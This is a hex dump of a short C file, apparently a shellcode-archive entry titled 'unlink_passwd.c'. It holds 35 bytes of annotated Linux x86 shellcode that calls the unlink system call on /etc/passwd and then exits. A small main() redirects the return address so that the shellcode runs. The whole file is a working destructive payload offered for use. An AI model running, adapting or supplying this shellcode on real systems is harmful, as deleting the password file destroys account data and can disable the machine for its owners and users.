00000000  2f 2a 0d 0a 20 20 20 20  75 6e 6c 69 6e 6b 5f 70  |/*..    unlink_p|
00000010  61 73 73 77 64 2e 63 0d  0a 20 20 20 20 50 6c 61  |asswd.c..    Pla|
00000020  74 66 6f 72 6d 3a 20 6c  69 6e 75 78 2f 78 38 36  |tform: linux/x86|
00000030  0d 0a 20 20 20 20 53 69  7a 65 3a 20 33 35 20 62  |..    Size: 35 b|
00000040  79 74 65 73 0d 0a 20 20  20 20 41 75 74 68 6f 72  |ytes..    Author|
00000050  3a 20 24 61 6e 64 6d 61  6e 20 3c 6e 34 6d 64 6e  |: $andman <n4mdn|
00000060  34 73 5b 34 54 5d 67 6d  61 69 6c 2e 63 6f 6d 3e  |4s[4T]gmail.com>|
00000070  0d 0a 2a 2f 0d 0a 0d 0a  23 69 6e 63 6c 75 64 65  |..*/....#include|
00000080  20 3c 73 74 72 69 6e 67  2e 68 3e 0d 0a 23 69 6e  | <string.h>..#in|
00000090  63 6c 75 64 65 20 3c 73  74 64 69 6f 2e 68 3e 0d  |clude <stdio.h>.|
000000a0  0a 63 68 61 72 20 73 68  65 6c 6c 5b 5d 20 3d 20  |.char shell[] = |
000000b0  20 22 5c 78 65 62 5c 78  31 31 22 20 20 20 20 20  | "\xeb\x11"     |
000000c0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 6a 6d  |            //jm|
000000d0  70 20 20 20 20 38 30 34  38 30 37 33 0d 0a 20 20  |p    8048073..  |
000000e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |              "\|
000000f0  78 35 65 22 20 20 20 20  20 20 20 20 20 20 20 20  |x5e"            |
00000100  20 20 20 20 20 20 20 20  20 2f 2f 70 6f 70 20 20  |         //pop  |
00000110  20 20 25 65 73 69 0d 0a  20 20 20 20 20 20 20 20  |  %esi..        |
00000120  20 20 20 20 20 20 20 20  22 5c 78 33 31 5c 78 63  |        "\x31\xc|
00000130  30 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0"              |
00000140  20 20 20 2f 2f 78 6f 72  20 20 20 20 25 65 61 78  |   //xor    %eax|
00000150  2c 25 65 61 78 0d 0a 20  20 20 20 20 20 20 20 20  |,%eax..         |
00000160  20 20 20 20 20 20 20 22  5c 78 33 31 5c 78 63 39  |       "\x31\xc9|
00000170  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000180  20 20 2f 2f 78 6f 72 20  20 20 20 25 65 63 78 2c  |  //xor    %ecx,|
00000190  25 65 63 78 0d 0a 20 20  20 20 20 20 20 20 20 20  |%ecx..          |
000001a0  20 20 20 20 20 20 22 5c  78 33 31 5c 78 64 32 22  |      "\x31\xd2"|
000001b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001c0  20 2f 2f 78 6f 72 20 20  20 20 25 65 64 78 2c 25  | //xor    %edx,%|
000001d0  65 64 78 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |edx..           |
000001e0  20 20 20 20 20 22 5c 78  62 30 5c 78 30 61 22 20  |     "\xb0\x0a" |
000001f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000200  2f 2f 6d 6f 76 20 20 20  20 24 30 78 61 2c 25 61  |//mov    $0xa,%a|
00000210  6c 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |l..             |
00000220  20 20 20 22 5c 78 38 39  5c 78 66 33 22 20 20 20  |   "\x89\xf3"   |
00000230  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000240  6d 6f 76 20 20 20 20 25  65 73 69 2c 25 65 62 78  |mov    %esi,%ebx|
00000250  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000260  20 20 22 5c 78 63 64 5c  78 38 30 22 20 20 20 20  |  "\xcd\x80"    |
00000270  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 69  |             //i|
00000280  6e 74 20 20 20 20 24 30  78 38 30 0d 0a 20 20 20  |nt    $0x80..   |
00000290  20 20 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |             "\x|
000002a0  62 30 5c 78 30 31 22 20  20 20 20 20 20 20 20 20  |b0\x01"         |
000002b0  20 20 20 20 20 20 20 20  2f 2f 6d 6f 76 20 20 20  |        //mov   |
000002c0  20 24 30 78 31 2c 25 61  6c 0d 0a 20 20 20 20 20  | $0x1,%al..     |
000002d0  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 63 64  |           "\xcd|
000002e0  5c 78 38 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x80"           |
000002f0  20 20 20 20 20 20 2f 2f  69 6e 74 20 20 20 20 24  |      //int    $|
00000300  30 78 38 30 0d 0a 20 20  20 20 20 20 20 20 20 20  |0x80..          |
00000310  20 20 20 20 20 20 22 5c  78 65 38 5c 78 65 61 5c  |      "\xe8\xea\|
00000320  78 66 66 5c 78 66 66 5c  78 66 66 22 20 20 20 20  |xff\xff\xff"    |
00000330  20 2f 2f 63 61 6c 6c 20  20 20 20 38 30 34 38 30  | //call    80480|
00000340  36 32 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |62..            |
00000350  20 20 20 20 22 5c 78 32  66 22 20 20 20 20 20 20  |    "\x2f"      |
00000360  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000370  20 20 20 20 0d 0a 20 20  20 20 20 20 20 20 20 20  |    ..          |
00000380  20 20 20 20 20 20 22 5c  78 36 35 22 20 20 20 20  |      "\x65"    |
00000390  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003a0  20 20 20 20 20 0d 0a 20  20 20 20 20 20 20 20 20  |     ..         |
000003b0  20 20 20 20 20 20 20 22  5c 78 37 34 5c 78 36 33  |       "\x74\x63|
000003c0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000003d0  20 20 20 20 0d 0a 20 20  20 20 20 20 20 20 20 20  |    ..          |
000003e0  20 20 20 20 20 20 22 5c  78 32 66 22 20 20 20 20  |      "\x2f"    |
000003f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000400  20 20 20 20 20 20 0d 0a  20 20 20 20 20 20 20 20  |      ..        |
00000410  20 20 20 20 20 20 20 20  22 5c 78 37 30 5c 78 36  |        "\x70\x6|
00000420  31 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1"              |
00000430  20 20 20 20 20 0d 0a 20  20 20 20 20 20 20 20 20  |     ..         |
00000440  20 20 20 20 20 20 20 22  5c 78 37 33 5c 78 37 33  |       "\x73\x73|
00000450  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000460  20 20 20 20 0d 0a 20 20  20 20 20 20 20 20 20 20  |    ..          |
00000470  20 20 20 20 20 20 22 5c  78 37 37 5c 78 36 34 22  |      "\x77\x64"|
00000480  3b 20 20 20 0d 0a 20 20  20 20 20 20 20 20 20 20  |;   ..          |
00000490  20 20 20 20 20 0d 0a 69  6e 74 20 6d 61 69 6e 28  |     ..int main(|
000004a0  29 0d 0a 7b 0d 0a 20 20  70 72 69 6e 74 66 28 22  |)..{..  printf("|
000004b0  53 68 65 6c 6c 63 6f 64  65 20 4c 65 6e 67 74 68  |Shellcode Length|
000004c0  3a 20 25 64 5c 6e 22 2c  73 74 72 6c 65 6e 28 73  |: %d\n",strlen(s|
000004d0  68 65 6c 6c 29 29 3b 0d  0a 20 20 69 6e 74 20 2a  |hell));..  int *|
000004e0  72 65 74 3b 0d 0a 20 20  72 65 74 20 3d 20 28 69  |ret;..  ret = (i|
000004f0  6e 74 20 2a 29 26 72 65  74 20 2b 20 32 3b 0d 0a  |nt *)&ret + 2;..|
00000500  20 20 28 2a 72 65 74 29  20 3d 20 28 69 6e 74 29  |  (*ret) = (int)|
00000510  73 68 65 6c 6c 3b 0d 0a  7d                       |shell;..}|
00000519
